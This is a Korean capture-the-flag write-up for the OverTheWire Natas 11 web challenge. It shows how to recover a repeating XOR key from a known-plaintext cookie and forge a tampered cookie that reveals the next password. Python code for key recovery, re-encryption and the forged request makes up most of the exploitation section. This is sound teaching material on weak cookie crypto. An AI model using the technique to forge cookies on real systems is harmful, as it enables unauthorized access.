# Category

web

# Overview

Cookies are protected with XOR encryption

Background color:
#ffffff

# Analysis

1. `xor_encrypt()` 함수를 통해 원본 메시지와 가려져있는 key값과 XOR 연산되어 나온 결과를 인코딩한 뒤 쿠키를 통해 돌려주는 코드를 확인할 수 있다.
2. 원본메시지의 형태와 XOR 연산된 결과값을 갖고 있기 때문에 `A XOR B = C`는 `C XOR B = A`처럼 역으로 연산하여 key값을 구해낼 수 있다.
3. 원본메시지를 `{"showpassword":"yes","bgcolor":"#ffffff"}`와 같이 `showpassword`를 `yes`로 변경하여 얻어낸 key값을 통해 연산한 결과로 쿠키 값을 변조하여 요청하면 다음 비밀번호를 획득할 수 있다.

# Exploitation

1.  최초 접근 시 쿠키에 담아 돌아오는 원본 메시지의 형태는 `{"showpassword":"no","bgcolor":"#ffffff"}`이며 연산과 인코딩을 거친 값이 쿠키에 저장이 되어 있어 브라우저 application을 통해 현재의 쿠키값 `HmYk...TRg=`을 가져올 수 있다.
2.  `xor_encrypt()`함수를 통해 원본메시지를 XOR연산한 뒤 base64 인코딩을 했기 때문에 역으로 key값을 구하기 위해 먼저 base64 decoding을 해준다
    ```py
    decoded = base64.b64decode("HmYk...TRg=")
    ```
3.  decoding한 값을 원본메시지와 XOR 연산하여 key값을 구한다. 각각 문자에 매칭되는 전체 key값을 구했을 때, 4글자로 반복되는 key값을 얻을 수 있으며, 원본코드에서는 `$key[$i % strlen($key)]`와 같이 key값의 일정 크기만큼 반복해서 꺼낸 값과 연산하기 때문에, 반복되는 앞 4글자의 key 값을 찾을 수 있다.

    ```py
    # 크기가 같은 decoded, original 1:1로 매핑시켜 XOR 연산
    def find_key(original: bytes, decoded: bytes):
       return bytes([d ^ o for d, o in zip(decoded, original)]).decode()[0:4]

    key = find_key(
       original=b'{"showpassword":"no","bgcolor":"#ffffff"}', decoded=decoded
    )
    ```

4.  다음 비밀번호를 획득하기 위해 통과 조건인 `"showpassword`를 `yes`로 변경하여 얻어낸 key와 다시 XOR연산을 해주고 base64 encoding 해준다면 cookie에 넣을 data 값을 구할 수 있다.

    ```py
    def xor_encrypt(msg: str, key: str) -> str:
        """
        key를 기반으로 msg를 xor_encrypt 후 base64 인코딩 결과 반환
        """
        encrypted = "".join(
            [chr(ord(msg[idx]) ^ ord(key[idx % len(key)])) for idx, _ in enumerate(msg)]
        )

        return base64.b64encode(encrypted.encode()).decode()

    # 다음 비밀번호를 받을 수 있게 showpassword를 yes로 바꿔 xor encrypt
    cookie_data = xor_encrypt(msg='{"showpassword":"yes","bgcolor":"#ffffff"}', key=key)
    ```

5.  얻어낸 cookie 데이터를 변조하여 서버에 요청하게 되면 다음 패스워드를 얻을 수 있다.

    ```py
    def get_flag(data: str, user_password: str):
        """
        서버에 변조한 쿠키를 심어서 요청
        """
        res = req(
            method="GET",
            url=f"http://natas11.natas.labs.overthewire.org",
            auth=("natas11", user_password),
            cookies={"data": data},
        )

        matched = re.search("(?<=natas12 is )\\w+", res.text)

        return matched.group() if matched else "NO FLAG"

    flag = get_flag(cookie_data, "UJ...Ek")
    ```

# Flag

`yZ...eB`
